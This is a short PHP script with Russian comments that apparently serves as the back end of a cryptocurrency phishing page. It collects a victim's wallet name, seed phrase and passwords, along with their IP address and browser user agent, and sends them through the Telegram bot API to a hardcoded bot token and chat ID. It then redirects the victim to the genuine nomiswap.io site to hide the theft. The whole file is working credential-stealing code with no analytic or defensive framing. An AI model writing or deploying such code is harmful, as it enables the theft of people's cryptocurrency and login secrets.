<?php
//Сбор данных из полей формы. password
$wallet = $_POST['wallet'];
$phrase = $_POST['phrase'];
$ip = $_SERVER['REMOTE_ADDR'];
$password = $_POST['password'];
$password2 = $_POST['password2'];


$token = "982822611:AAEJb34wah2gkt0MDwJorSbSmcnqBXQWAMA"; // Тут пишем токен
$chat_id = "402285927"; // Тут пишем ID группы, куда будут отправляться сообщения
$sitename = "\xF0\x9F\x92\xB8 Поздравляем, новый ключ!";

$arr = array(

  '' => $sitename,
  'Кошелёк: ' => $wallet,
  'Фраза: ' => $phrase,
  'Password:' => (!empty($password) ? $password : '...'),
  'Password2:' => (!empty($password2) ? $password2 : '...'),
  'IP: ' => $ip,
  'UserAgent' => $_SERVER['HTTP_USER_AGENT'],

);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: https://nomiswap.io/');
} else {
  echo "Error";
}
?>